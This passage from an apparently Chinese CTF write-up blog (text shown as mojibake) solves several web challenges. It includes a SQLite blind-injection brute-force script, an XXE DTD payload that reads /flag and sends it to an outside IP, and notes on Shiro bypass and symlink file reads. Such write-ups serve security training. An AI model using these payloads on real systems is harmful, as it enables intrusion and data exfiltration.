punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Vote id contains dangerous chars'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// update database</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sqlite:../db/vote.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'An error occurred while updating database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// succeeded!</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span>  <span class="token string single-quoted-string">'message'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Thank you for your vote! The result will be published after the CTF finished.'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ²¡è§è¿‡çš„sqliteï¼Œé¢˜è§£</p><blockquote><p>è§£é¢˜æ€è·¯æ˜¯åˆ©ç”¨sqliteé€»è¾‘æŠ¥é”™è¿›è¡Œç›²æ³¨,abså‡½æ•°å­˜åœ¨æ•´å‹æº¢å‡º</p><p>åˆ©ç”¨ifnull,nullifæ³¨å…¥flagé•¿åº¦</p></blockquote><pre class="line-numbers language-none"><code class="language-none">abs(ifnull(nullif(length((SELECT(flag)from(flag))),&#123;i&#125;),0x8000000000000000))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™å¥è¯­å¥çš„æ„æ€æ˜¯ï¼Œå¦‚æœå‰é¢çš„lengthçš„å€¼ç­‰äºæˆ‘ä»¬ä¼ å…¥içš„å€¼ï¼Œé‚£ä¹ˆnullifå°±ä¼šè¿”å›nullï¼Œå¦‚æœè¿”å›äº†nullé‚£ä¹ˆifnullå°±ä¼šè¿”å›åé¢çš„å€¼ï¼Œæ­¤æ—¶absæº¢å‡ºæŠ¥é”™ï¼Œå¯ä»¥æ‹¿åˆ°flagé•¿åº¦</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://ba37c8a1-58fb-4250-a1f0-236c553ac9d6.node4.buuoj.cn:81/vote.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">),0x8000000000000000))'</span></span>    <span class="token punctuation">&#125;</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'An error occurred'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'length: '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åé€šè¿‡||æ¥æ‹¼æ¥å­—ç¬¦ï¼Œé€šè¿‡replaceæ¥è¿›è¡Œé€ä½çŒœæµ‹ï¼Œé€šè¿‡è¿”å›çš„é•¿åº¦æ¥åšåˆ¤æ–­ï¼Œè€Œå¯¹äºå­—æ¯åˆ™ä½¿ç”¨hexæ¥æå–</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">table <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>table<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span> <span class="token comment"># 'zebra' â†’ '7A65627261'</span>table<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(typeof(.1)),12567)'</span> <span class="token comment"># 'real' â†’ '7265616C'</span>table<span class="token punctuation">[</span><span class="token string">'D'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0xffffffffffffffff),123)'</span> <span class="token comment"># 0xffffffffffffffff = -1 â†’ '2D31'</span>table<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0.1),1230)'</span> <span class="token comment"># 0.1 â†’ 302E31</span>table<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span> <span class="token comment"># 'dog' â†’ '646F67'</span>table<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"C"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"F"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span> <span class="token comment"># 'koala' â†’ '6B6F616C61'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆé€šè¿‡<a href="https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/#Sqlite-Voting">è„šæœ¬</a>æ‹¿åˆ°flag</p><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-filejava"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-filejava" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava</h2><p>ä¸€ä¸ªä¸Šä¼ ï¼Œä¸Šä¼ ä¹‹åå¯ä»¥ä¸‹è½½ï¼Œçœ‹åˆ°é“¾æ¥é‡Œé¢æœ‰æ–‡ä»¶åï¼Œå°è¯•ç›®å½•ç©¿è¶Šæ‹¿web.xmlæ–‡ä»¶<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210022204005.png"></p><p>ä¸‹è½½classï¼ˆ<code>../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</code>ï¼‰è¿›è¡Œåç¼–è¯‘ï¼Œå¾—åˆ°æºç ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹ä¸Šä¼ çš„å…³é”®éƒ¨åˆ†</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"excel-"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"xlsx"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>fileExtName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">Workbook</span> wb1 <span class="token operator">=</span> <span class="token class-name">WorkbookFactory</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Sheet</span> sheet <span class="token operator">=</span> wb1<span class="token punctuation">.</span><span class="token function">getSheetAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sheet<span class="token punctuation">.</span><span class="token function">getFirstRowNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidFormatException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"poi-ooxml-3.10 has something wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„ä½¿ç”¨<code>poi-ooxml-3.10</code>æ¥è§£ææ•°æ®ï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰æ¼æ´å¯å¯¼è‡´XXEï¼ŒCVE-2014-3529</p><p>é‚£ä¹ˆå°±ç›´æ¥åˆ©ç”¨ï¼Œé¦–å…ˆåœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šæ”¾ä¸€ä¸ªf.dtd</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;182.61.46.138?p&#x3D;%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åæ›´æ”¹xlsxä¸­çš„[Content_Types].xmlæ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;182.61.46.138&#x2F;f.dtd&quot;&gt;%remote;%int;%send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é‡æ–°å‹ç¼©ä¸Šä¼ å³å¯æ¥æ”¶flag</p><h2 id="HXBCTF-2021-easywill"><a href="#HXBCTF-2021-easywill" class="headerlink" title="[HXBCTF 2021]easywill"></a>[HXBCTF 2021]easywill</h2><p>è·Ÿæºç ï¼Œåé¢å†è¡¥</p><h2 id="ç¾ŠåŸæ¯-2020-EasySer"><a href="#ç¾ŠåŸæ¯-2020-EasySer" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]EasySer"></a>[ç¾ŠåŸæ¯ 2020]EasySer</h2><p>ä¸ç»™æºç å°±æ˜¯çº¯çº¯æœ‰ç—…çš„è°œè¯­é¢˜ï¼Œç»™äº†æºç ç®€å•å¤šäº†ï¼Œæ­£å¸¸åºåˆ—åŒ–ä½¿ç”¨base64ç»•è¿‡dieå³å¯</p><h2 id="JMCTF-2021-UploadHub"><a href="#JMCTF-2021-UploadHub" class="headerlink" title="[JMCTF 2021]UploadHub"></a>[JMCTF 2021]UploadHub</h2><p>.htaccess</p><h2 id="çº¢æ˜è°·CTF-2021-JavaWeb"><a href="#çº¢æ˜è°·CTF-2021-JavaWeb" class="headerlink" title="[çº¢æ˜è°·CTF 2021]JavaWeb"></a>[çº¢æ˜è°·CTF 2021]JavaWeb</h2><p>javaï¼Œè¿›å»å°±æ˜¯è®©æˆ‘ä»¬loginï¼Œloginé¡µé¢è®©æˆ‘ä»¬è®¿é—®jsonï¼Œä½†æ˜¯æ²¡æƒé™éœ€è¦å…ˆç™»å½•ï¼Œé‚£å°±å°è¯•ä¼ å…¥ç™»å½•ï¼Œç™»å½•å¤±è´¥ï¼Œä½†æ˜¯çœ‹å“åº”å¤´<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210070120704.png"></p><p>setCookieä¸­çš„deleteMeå¯ä»¥ç¡®è®¤ä½¿ç”¨çš„æ˜¯shiroæ¡†æ¶ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥</p><p>é‚£ä¹ˆé¦–å…ˆä½¿ç”¨CVE-2020-11989æ¥è¿›è¡ŒApache Shiroæƒé™ç»•è¿‡ï¼ŒåŠ ä¸ª/;/jsonæ¥ç›´æ¥è®¿é—®json</p><p>ç„¶åä½¿ç”¨CVE-2019-14439çš„ååºåˆ—åŒ–é“¾æ‰“è¿›å»ï¼Œç”¨JNDI-Injection-Exploitæ¥ç”Ÿæˆpayload</p><h2 id="HCTF-2018-Hideandseek"><a href="#HCTF-2018-Hideandseek" class="headerlink" title="[HCTF 2018]Hideandseek"></a>[HCTF 2018]Hideandseek</h2><p>ç™»å½•ï¼Œä»»æ„è¾“å…¥é™¤adminä¹‹å¤–çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œç„¶åå°±è®©ä¸Šä¼ zipï¼Œç¬¬ä¸€ä»¶äº‹å°±æƒ³åˆ°è½¯è¿æ¥ï¼Œç¡®å®å¯ä»¥<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210102353287.png"></p><p>é‚£è¯»ä¸€ä¸‹æºç å§ï¼Œç›²çŒœæ˜¯ä¸ªpythonï¼Œprocè¯»è¯•è¯•ï¼Œ<del>äº‹å®è¯æ˜ç›´æ¥è½æ˜¯æ²¡ä»€ä¹ˆåµå­ç”¨çš„</del>ï¼Œè¿˜æ˜¯ä¹–ä¹–è¯»äº†environï¼Œç„¶å/app/main.pyè¯»æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>session<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> request<span class="token punctuation">,</span>Response<span class="token keyword">import</span> uuid<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">import</span> flag<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename<span class="token keyword">import</span> osrandom<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'./uploads'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">1024</span>ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'zip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> \           filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    error <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>error <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> forbidden<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> user<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>    password<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> username <span class="token operator">!=</span> <span class="token string">''</span> <span class="token keyword">and</span> password <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>error<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'the_file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'the_file'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">file</span> <span class="token keyword">and</span> allowed_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>        filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>        file_save_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'This file already exists'</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'This file is not a zipfile'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        extract_path <span class="token operator">=</span> file_save_path <span class="token operator">+</span> <span class="token string">'_'</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'unzip -n '</span> <span class="token operator">+</span> file_save_path <span class="token operator">+</span> <span class="token string">' -d '</span><span class="token operator">+</span> extract_path<span class="token punctuation">)</span>        read_obj <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat '</span> <span class="token operator">+</span> extract_path <span class="token operator">+</span> <span class="token string">'/*'</span><span class="token punctuation">)</span>        <span class="token builtin">file</span> <span class="token operator">=</span> read_obj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        read_obj<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm -rf '</span> <span class="token operator">+</span> extract_path<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token boolean">None</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">file</span> <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'aGN0Zg=='</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment">#app.run(debug=True)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">10008</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä»£ç è¯»ä¸€ä¸‹éšæœºæ•°çš„ç§å­</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> uuid<span class="token keyword">import</span> randommac <span class="token operator">=</span> <span class="token string">"0e:48:30:60:37:27"</span>temp <span class="token operator">=</span> mac<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">bin</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token 